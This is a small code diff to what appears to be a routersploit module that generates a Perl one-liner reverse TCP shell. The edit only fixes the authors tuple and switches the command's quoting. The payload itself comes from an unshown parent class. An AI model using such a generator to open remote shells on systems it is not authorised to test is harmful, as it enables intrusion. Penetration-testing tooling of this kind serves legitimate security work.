@@ -7,7 +7,7 @@ class Exploit(PerlReverseTCP):
         "name": "Perl Reverse TCP One-Liner",
         "description": "Creates interactive tcp reverse shell by using perl one-liner.",
         "authors": (
-            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
+            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
         ),
     }
 
@@ -16,5 +16,5 @@ class Exploit(PerlReverseTCP):
     def generate(self):
         payload = super(Exploit, self).generate()
 
-        cmd = "{} -MIO -e '{}'".format(self.cmd, payload)
+        cmd = "{} -MIO -e \"{}\"".format(self.cmd, payload)
         return cmd
